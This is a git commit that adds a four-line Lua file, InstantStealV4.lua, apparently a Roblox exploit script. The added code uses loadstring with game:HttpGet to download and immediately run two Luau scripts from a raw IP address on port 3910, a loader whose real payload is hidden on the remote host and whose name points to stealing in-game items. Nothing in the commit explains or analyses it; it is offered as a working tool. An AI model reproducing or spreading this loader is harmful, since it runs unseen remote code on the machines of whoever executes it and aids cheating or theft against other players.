18a74b5c4335f2fda5ac80ea53ced9ed7d21ba6a
SabScriptOp <ianzzz99901@gmail.com>
2025-10-21 12:59:59 +0800

    Add InstantStealV4.lua

---
+++ InstantStealV4.lua
@@ -0,0 +1,4 @@
+ID="8977e808-6f41-4b8d-bf92-a38b71be65f3";
+RUN_AFTER=loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"));
+
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
